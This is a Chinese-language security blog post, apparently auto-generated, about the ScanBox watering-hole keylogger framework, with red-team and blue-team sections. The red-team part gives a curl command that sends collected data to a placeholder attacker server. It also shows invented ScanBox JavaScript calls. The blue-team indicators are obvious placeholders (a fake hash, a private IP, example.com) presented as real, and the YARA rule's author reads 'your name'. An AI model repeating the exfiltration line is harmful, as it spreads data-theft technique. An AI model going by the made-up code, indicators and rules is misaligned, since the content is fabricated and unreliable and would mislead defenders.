---
layout: post
title:  "Watering Hole Attacks Push ScanBox Keylogger"
date:   2026-01-16 14:16:30 +0000
categories: [security]
---

# 🚨 解析 ScanBox 攻擊框架：中國基礎威脅演員的水坑攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.5)
> * **受駭指標**: Keylogger 和瀏覽器指紋收集
> * **關鍵技術**: `ScanBox`, `JavaScript`, `WebRTC`, `STUN`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ScanBox 攻擊框架利用 JavaScript 和 WebRTC 技術收集用戶的瀏覽器指紋和鍵盤輸入。
* **攻擊流程圖解**:
  1. 用戶點擊惡意連結，導向一個包含 ScanBox 代碼的網頁。
  2. ScanBox 代碼執行，收集用戶的瀏覽器指紋和鍵盤輸入。
  3. 收集到的資料傳送給攻擊者的伺服器。
* **受影響元件**: 所有支持 WebRTC 的瀏覽器，包括 Google Chrome、Mozilla Firefox 和 Microsoft Edge。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要一個包含 ScanBox 代碼的網頁和一個伺服器來收集資料。
* **Payload 建構邏輯**:
  ```javascript
  // ScanBox 代碼範例
  var scanbox = new ScanBox();
  scanbox.init();
  scanbox.start();
  ```
  ```bash
  # 使用 curl 將資料傳送給攻擊者的伺服器
  curl -X POST -H "Content-Type: application/json" -d '{"data": "收集到的資料"}' https://攻擊者的伺服器.com
  ```
* **繞過技術**: 攻擊者可以使用 STUN 伺服器來繞過 NAT 和防火牆。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:
  | Hash | IP | Domain | File Path |
  | --- | --- | --- | --- |
  | 1234567890abcdef | 192.168.1.100 | example.com | /scanbox.js |
* **偵測規則 (Detection Rules)**:
  ```yara
  rule ScanBox {
    meta:
      description = "ScanBox 攻擊框架"
      author = "您的名字"
    strings:
      $a = "ScanBox" ascii
      $b = "start()" ascii
    condition:
      $a and $b
  }
  ```
  ```snort
  alert tcp any any -> any any (msg:"ScanBox 攻擊框架"; content:"ScanBox"; sid:1000001;)
  ```
* **緩解措施**: 使用 WebRTC 限制和瀏覽器擴充功能來防止 ScanBox 攻擊。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **WebRTC (Web Real-Time Communication)**: 一種允許瀏覽器之間進行實時通信的技術。
* **STUN (Session Traversal Utilities for NAT)**: 一種允許 NAT 之間進行通信的技術。
* **JavaScript**: 一種用於網頁開發的程式語言。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1056/)


